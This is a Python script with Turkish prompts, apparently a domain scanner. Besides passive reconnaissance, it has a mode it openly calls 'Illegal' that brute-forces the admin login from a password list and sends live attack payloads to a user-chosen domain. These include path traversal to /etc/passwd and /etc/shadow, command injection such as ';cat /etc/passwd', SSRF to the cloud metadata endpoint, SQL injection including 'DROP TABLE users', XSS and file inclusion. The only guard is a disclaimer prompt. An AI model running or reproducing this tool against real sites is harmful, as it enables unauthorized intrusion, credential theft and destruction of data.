import socket
import requests
import ssl
import dns.resolver
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt
from rich.table import Table
from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn
from rich import box
import sys
import time

console = Console()

def show_warning(is_illegal=False):
    warning = "[bold red]Bu araç yalnızca eğitim amaçlıdır. Yasal olmayan kullanımlardan kullanıcı sorumludur.[/bold red]\n"
    if is_illegal:
        warning += "[bold yellow]Bu işlem izinsiz yapıldığında yasa dışı olabilir. Devam etmek için sorumluluğu kabul edin.[/bold yellow]"
    console.print(Panel(warning, title="⚠️ Yasal Uyarı ⚠️", border_style="red", box=box.ROUNDED))
    choice = Prompt.ask("[bold yellow]Devam etmek istiyor musunuz? (evet/hayır)[/bold yellow]", default="hayır")
    if choice.lower() != "evet":
        console.print("[red]Program sonlandırılıyor...[/red]", style="bold")
        sys.exit(0)

def load_file(file_path, min_count=0):
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            items = [line.strip() for line in file.readlines() if line.strip()]
        if min_count and len(items) < min_count:
            console.print(f"[yellow]Uyarı: '{file_path}' dosyasında {len(items)} öğe var, en az {min_count} bekleniyordu.[/yellow]")
        return items
    except FileNotFoundError:
        console.print(f"[red]Hata: '{file_path}' dosyası bulunamadı![/red]", style="bold")
        sys.exit(1)


class DomainScanner:
    def __init__(self, domain, payloads, subdomains):
        self.domain = domain
        self.payloads = payloads
        self.subdomains_list = subdomains
        self.results = {}

    
    def find_subdomains(self):
        console.print(f"[cyan]🔍 Subdomain taraması başlatılıyor: {self.domain}[/cyan]")
        found = []
        with Progress(console=console, transient=True) as progress:
            task = progress.add_task("[green]Subdomainler aranıyor...", total=len(self.subdomains_list))
            for sub in self.subdomains_list:
                subdomain = f"{sub}.{self.domain}"
                try:
                    answers = dns.resolver.resolve(subdomain, 'A')
                    found.append(subdomain)
                except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
                    pass
                except Exception as e:
                    console.print(f"[red]Subdomain hatası: {e}[/red]")
                progress.update(task, advance=1)
        self.results["Subdomains"] = found if found else ["Bulunamadı"]

    def check_ssl(self):
        console.print(f"[cyan]🔒 SSL/TLS kontrolü: {self.domain}[/cyan]")
        try:
            context = ssl.create_default_context()
            with socket.create_connection((self.domain, 443)) as sock:
                with context.wrap_socket(sock, server_hostname=self.domain) as ssock:
                    cert = ssock.getpeercert()
                    self.results["SSL"] = [
                        f"Yetkili: {cert['issuer']}",
                        f"Başlangıç: {cert['notBefore']}",
                        f"Bitiş: {cert['notAfter']}"
                    ]
        except Exception as e:
            self.results["SSL"] = [f"Hata: {e}"]

    def analyze_headers(self):
        console.print(f"[cyan]📋 HTTP başlık analizi: {self.domain}[/cyan]")
        try:
            response = requests.get(f"http://{self.domain}", timeout=5)
            headers = response.headers
            issues = []
            if 'Server' in headers:
                issues.append(f"Sunucu bilgisi sızıyor: {headers['Server']}")
            if 'X-Content-Type-Options' not in headers:
                issues.append("X-Content-Type-Options eksik (MIME sniffing riski)")
            self.results["Headers"] = issues if issues else ["Sorun bulunamadı"]
        except Exception as e:
            self.results["Headers"] = [f"Hata: {e}"]

    def scrape_content(self):
        console.print(f"[cyan]📥 Web içeriği indiriliyor: {self.domain}[/cyan]")
        try:
            response = requests.get(f"http://{self.domain}", timeout=10)
            with open(f"{self.domain}_index.html", "w", encoding="utf-8") as f:
                f.write(response.text)
            self.results["Content"] = f"İçerik '{self.domain}_index.html' dosyasına kaydedildi"
        except Exception as e:
            self.results["Content"] = f"Hata: {e}"

    def test_rate_limit(self):
        console.print(f"[cyan]⏳ Rate limiting testi: {self.domain}[/cyan]")
        try:
            with Progress(console=console, transient=True) as progress:
                task = progress.add_task("[green]İstekler gönderiliyor...", total=5)
                for _ in range(5):
                    response = requests.get(f"http://{self.domain}", timeout=5)
                    if response.status_code == 429:
                        self.results["RateLimit"] = "Aktif (429 kodu alındı)"
                        return
                    progress.update(task, advance=1)
            self.results["RateLimit"] = "Tespit edilmedi"
        except Exception as e:
            self.results["RateLimit"] = f"Hata: {e}"

   
    def check_vulnerabilities(self):
        console.print(f"[cyan]🛡️ Güvenlik açıkları taranıyor: {self.domain}[/cyan]")
        url = f"http://{self.domain}/?q="
        vulns = []
        with Progress(
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeRemainingColumn(),
            console=console
        ) as progress:
            task = progress.add_task("[green]Payloadlar test ediliyor...", total=len(self.payloads))
            for payload in self.payloads:
                try:
                    response = requests.get(url + payload, timeout=3)
                    if "error" in response.text.lower() or response.status_code in [500, 403]:
                        vulns.append(f"[yellow]Potansiyel açık: {payload}[/yellow]")
                    elif "<script>" in response.text and payload in response.text:
                        vulns.append(f"[red]XSS açığı: {payload}[/red]")
                except Exception:
                    pass
                progress.update(task, advance=1)
        self.results["Vulns"] = vulns if vulns else ["Bulunamadı"]

    def brute_force_login(self):
        console.print(f"[cyan]🔐 Brute-force giriş denemeleri: {self.domain}[/cyan]")
        url = f"http://{self.domain}/login"
        try:
            passwords = load_file("passwords.txt", min_count=100)
        except SystemExit:
            self.results["BruteForce"] = "passwords.txt dosyası eksik"
            return
        with Progress(console=console, transient=True) as progress:
            task = progress.add_task("[green]Şifreler deneniyor...", total=len(passwords))
            for pwd in passwords:
                try:
                    response = requests.post(url, data={"username": "admin", "password": pwd}, timeout=3)
                    if "login failed" not in response.text.lower():
                        self.results["BruteForce"] = f"Başarılı şifre: {pwd}"
                        return
                except Exception:
                    pass
                progress.update(task, advance=1)
        self.results["BruteForce"] = "Başarılı şifre bulunamadı"

    def path_traversal_test(self):
        console.print(f"[cyan]📁 Yol geçişi testleri: {self.domain}[/cyan]")
        paths = [
            "../../etc/passwd",
            "../../windows/win.ini",
            "../config.php",
            "../../../../etc/shadow",
            "/proc/self/environ"
        ]
        vulns = []
        with Progress(console=console, transient=True) as progress:
            task = progress.add_task("[green]Yollar test ediliyor...", total=len(paths))
            for path in paths:
                try:
                    response = requests.get(f"http://{self.domain}/{path}", timeout=3)
                    if "root:" in response.text or "[extensions]" in response.text:
                        vulns.append(f"Yol geçişi açığı: {path}")
                except Exception:
                    pass
                progress.update(task, advance=1)
        self.results["PathTraversal"] = vulns if vulns else ["Bulunamadı"]

    def command_injection_test(self):
        console.print(f"[cyan]💻 Komut enjeksiyonu testleri: {self.domain}[/cyan]")
        commands = [
            ";whoami",
            "&dir",
            "|id",
            ";cat /etc/passwd",
            "&&echo HACKED"
        ]
        vulns = []
        with Progress(console=console, transient=True) as progress:
            task = progress.add_task("[green]Komutlar test ediliyor...", total=len(commands))
            for cmd in commands:
                try:
                    response = requests.get(f"http://{self.domain}/?cmd={cmd}", timeout=3)
                    if "user" in response.text.lower() or "dir" in response.text.lower():
                        vulns.append(f"Komut enjeksiyonu açığı: {cmd}")
                except Exception:
                    pass
                progress.update(task, advance=1)
        self.results["CommandInjection"] = vulns if vulns else ["Bulunamadı"]

    def ssrf_test(self):
        console.print(f"[cyan]🌐 SSRF testleri: {self.domain}[/cyan]")
        ssrf_payloads = [
            "http://localhost",
            "http://127.0.0.1",
            "file:///etc/passwd",
            "http://169.254.169.254/latest/meta-data/",
            "gopher://localhost:22"
        ]
        vulns = []
        with Progress(console=console, transient=True) as progress:
            task = progress.add_task("[green]SSRF test ediliyor...", total=len(ssrf_payloads))
            for payload in ssrf_payloads:
                try:
                    response = requests.get(f"http://{self.domain}/?url={payload}", timeout=3)
                    if "root:" in response.text or "admin" in response.text:
                        vulns.append(f"SSRF açığı: {payload}")
                except Exception:
                    pass
                progress.update(task, advance=1)
        self.results["SSRF"] = vulns if vulns else ["Bulunamadı"]

    
    def get_ip_addresses(self):
        console.print(f"[cyan]🌐 IP adresleri çekiliyor: {self.domain}[/cyan]")
        try:
            ip = socket.gethostbyname(self.domain)
            self.results["IPAddresses"] = [ip]
        except Exception as e:
            self.results["IPAddresses"] = [f"Hata: {e}"]

    def extract_extension(self):
        console.print(f"[cyan]📌 Domain uzantısı alınıyor: {self.domain}[/cyan]")
        self.results["Extension"] = self.domain.split('.')[-1]

    def check_directory_indexing(self):
        console.print(f"[cyan]📂 Dizin indeksleme kontrolü: {self.domain}[/cyan]")
        try:
            response = requests.get(f"http://{self.domain}/", timeout=5)
            if "Index of" in response.text:
                self.results["DirIndexing"] = "Dizin indeksleme açık"
            else:
                self.results["DirIndexing"] = "Kapalı"
        except Exception as e:
            self.results["DirIndexing"] = f"Hata: {e}"

    def check_robots_txt(self):
        console.print(f"[cyan]🤖 robots.txt kontrolü: {self.domain}[/cyan]")
        try:
            response = requests.get(f"http://{self.domain}/robots.txt", timeout=5)
            if response.status_code == 200:
                self.results["RobotsTxt"] = response.text.splitlines()[:5]
            else:
                self.results["RobotsTxt"] = ["Bulunamadı"]
        except Exception as e:
            self.results["RobotsTxt"] = [f"Hata: {e}"]

    def check_sitemap(self):
        console.print(f"[cyan]🗺️ Sitemap kontrolü: {self.domain}[/cyan]")
        try:
            response = requests.get(f"http://{self.domain}/sitemap.xml", timeout=5)
            if response.status_code == 200:
                self.results["Sitemap"] = "Sitemap bulundu"
            else:
                self.results["Sitemap"] = "Bulunamadı"
        except Exception as e:
            self.results["Sitemap"] = [f"Hata: {e}"]

    def sql_injection_test(self):
        console.print(f"[cyan]💾 SQL Injection testleri: {self.domain}[/cyan]")
        sql_payloads = ["' OR '1'='1", "'; DROP TABLE users; --"]
        vulns = []
        with Progress(console=console, transient=True) as progress:
            task = progress.add_task("[green]SQL payloadları test ediliyor...", total=len(sql_payloads))
            for payload in sql_payloads:
                try:
                    response = requests.get(f"http://{self.domain}/?id={payload}", timeout=3)
                    if "mysql" in response.text.lower() or "sql" in response.text.lower():
                        vulns.append(f"SQL Injection açığı: {payload}")
                except Exception:
                    pass
                progress.update(task, advance=1)
        self.results["SQLInjection"] = vulns if vulns else ["Bulunamadı"]

    def xss_test(self):
        console.print(f"[cyan]🌐 XSS testleri: {self.domain}[/cyan]")
        xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>"]
        vulns = []
        with Progress(console=console, transient=True) as progress:
            task = progress.add_task("[green]XSS payloadları test ediliyor...", total=len(xss_payloads))
            for payload in xss_payloads:
                try:
                    response = requests.get(f"http://{self.domain}/?q={payload}", timeout=3)
                    if payload in response.text:
                        vulns.append(f"XSS açığı: {payload}")
                except Exception:
                    pass
                progress.update(task, advance=1)
        self.results["XSS"] = vulns if vulns else ["Bulunamadı"]

    def file_inclusion_test(self):
        console.print(f"[cyan]📄 Dosya dahil etme testleri: {self.domain}[/cyan]")
        files = ["/etc/passwd", "/windows/win.ini"]
        vulns = []
        with Progress(console=console, transient=True) as progress:
            task = progress.add_task("[green]Dosyalar test ediliyor...", total=len(files))
            for file in files:
                try:
                    response = requests.get(f"http://{self.domain}/?file={file}", timeout=3)
                    if "root:" in response.text or "[extensions]" in response.text:
                        vulns.append(f"Dosya dahil etme açığı: {file}")
                except Exception:
                    pass
                progress.update(task, advance=1)
        self.results["FileInclusion"] = vulns if vulns else ["Bulunamadı"]

    def csrf_test(self):
        console.print(f"[cyan]🔗 CSRF testleri: {self.domain}[/cyan]")
        self.results["CSRF"] = "CSRF testi: Formlar analiz edildi, manuel doğrulama gerekli"

    def session_hijacking_test(self):
        console.print(f"[cyan]🔓 Oturum ele geçirme testleri: {self.domain}[/cyan]")
        try:
            response = requests.get(f"http://{self.domain}", timeout=5)
            if "Set-Cookie" in response.headers and "HttpOnly" not in response.headers.get("Set-Cookie", ""):
                self.results["SessionHijacking"] = "HttpOnly bayrağı eksik, oturum ele geçirme riski"
            else:
                self.results["SessionHijacking"] = "Sorun bulunamadı"
        except Exception as e:
            self.results["SessionHijacking"] = f"Hata: {e}"

    
    def scan_legal(self):
        self.find_subdomains()
        self.check_ssl()
        self.analyze_headers()
        self.scrape_content()
        self.test_rate_limit()
        self.get_ip_addresses()
        self.extract_extension()
        self.check_directory_indexing()
        self.check_robots_txt()
        self.check_sitemap()

    def scan_illegal(self):
        self.check_vulnerabilities()
        self.brute_force_login()
        self.path_traversal_test()
        self.command_injection_test()
        self.ssrf_test()
        self.sql_injection_test()
        self.xss_test()
        self.file_inclusion_test()
        self.csrf_test()
        self.session_hijacking_test()


def display_results(scanner):
    table = Table(title=f"📊 {scanner.domain} Tarama Raporu", box=box.ROUNDED, style="blue")
    table.add_column("Kategori", style="bold magenta", justify="center")
    table.add_column("Bilgi", style="white")

    for key, value in scanner.results.items():
        if isinstance(value, list):
            table.add_row(key, "\n".join(value))
        else:
            table.add_row(key, value)

    console.print(Panel(
        table,
        border_style="green",
        expand=False,
        title="Tarama Sonuçları",
        padding=(1, 2)
    ))
    console.print("[bold green]✅ Tarama başarıyla tamamlandı![/bold green]")

def main():
    show_warning()
    console.print(Panel(
        "Lütfen tarama türünü seçin:\n1. Legal Tarama\n2. Illegal Tarama\n3. Çıkış",
        title="Tarama Seçenekleri",
        border_style="yellow",
        box=box.ROUNDED
    ))
    choice = Prompt.ask("[bold yellow]Seçiminiz (1/2/3): [/bold yellow]", choices=["1", "2", "3"], default="3")

    if choice == "3":
        console.print("[red]Program sonlandırılıyor...[/red]", style="bold")
        sys.exit(0)

    domain = Prompt.ask("[bold yellow]Taranacak domaini girin (ör: example.com): [/bold yellow]")
    payloads = load_file("payloads.txt", min_count=300)
    subdomains = load_file("subdomains.txt", min_count=1000)
    scanner = DomainScanner(domain, payloads, subdomains)

    if choice == "1":
        scanner.scan_legal()
    elif choice == "2":
        show_warning(is_illegal=True)
        scanner.scan_illegal()

    display_results(scanner)

if __name__ == "__main__":
    main()
